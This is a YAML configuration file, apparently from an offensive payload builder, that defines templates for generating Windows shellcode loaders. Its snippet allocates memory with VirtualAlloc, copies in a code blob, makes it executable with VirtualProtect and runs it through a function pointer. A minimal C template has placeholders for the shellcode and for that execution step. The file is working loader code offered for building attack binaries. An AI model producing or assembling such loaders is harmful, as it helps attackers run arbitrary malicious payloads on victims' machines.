sections:
- header: Shellcode Execution
  template: shellcodeexecution
  display: Shellcode Execution
  allowMultiple: false
  items:
  - id: VirtualAllocExec
    display: VirtualAlloc + Function Pointer
    default: true
    snippet: |
      // Execute via VirtualAlloc + function pointer
      {
          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (execMem == NULL) return -1;
          
          memcpy(execMem, code_blob, code_blob_len);
          
          DWORD oldProtect;
          if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
              VirtualFree(execMem, 0, MEM_RELEASE);
              return -1;
          }
          
          ((void(*)())execMem)();
          
          VirtualFree(execMem, 0, MEM_RELEASE);
      }




templates:
- id: minimal
  display: Shellcode Minimal
  description: Minimal loader - only shellcode setup and execution.
  content: |
    #define WIN32_LEAN_AND_MEAN
    #include <windows.h>

    INT main(VOID)
    {
        {{SHELLCODE_SOURCE}}

        {{SHELLCODE_EXECUTION}}

        return 0;
    }
    
  placeholders:
  - name: SHELLCODE_SOURCE
    kind: system
  - name: SHELLCODE_EXECUTION
    kind: snippet
    snippetTemplate: shellcodeexecution
